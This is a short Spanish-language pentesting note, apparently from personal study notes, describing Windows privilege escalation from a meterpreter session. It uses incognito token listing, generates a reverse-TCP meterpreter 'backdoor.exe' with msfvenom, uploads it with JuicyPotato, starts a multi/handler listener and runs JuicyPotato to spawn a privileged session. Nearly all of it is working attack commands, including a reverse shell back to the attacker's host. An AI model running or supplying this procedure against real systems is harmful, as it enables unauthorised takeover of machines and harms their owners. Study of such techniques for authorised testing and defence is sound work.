Descripción

A partir de una sesión de meterpreter vamos a ejecutar los siguientes comandos:

```bash
#conocer sistema
getuid
#ver los privilegios
getprivs
#cargar módulo incognito
load incognito
#ver los tokens disponibles
list_tokens -u
```

En el ejemplo vemos los siguientes

![[Pasted image 20250220090513.png]]

Ninguno de altos privilegios. Lo que vamos a hacer es crear un paylaod con msfvenom

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > backdoor.exe
```

Desde la sesión de meterpreter podemos subir el archivo malicioso que acabamos de generar.

```bash
upload backdoor.exe

#También vamos a subir el binario de Juicy Potato
upload /root/Desktop/tools/JuicyPotato.exe
#Ponemos la sesión en background
background
#Utilizamos el multi/handler
use multi/handler
exploit

#Volvemos a la sesion de meterpreter mientras se ejecuta el multi/handler
sessions 1

#ejecutar juicypotato
shell
JuicyPotato.exe -l 555 -p C:\users\Public\backdoor.exe -t * -c codigo
#Para obtener el código hay que utilizar una CLS que se obtiene según la versión de windows utilizada. para ver entrar en al url:https://github.com/ohpe/juicy-potato
```

Con esto deberíamos generar una sesión con usuario con privilegios.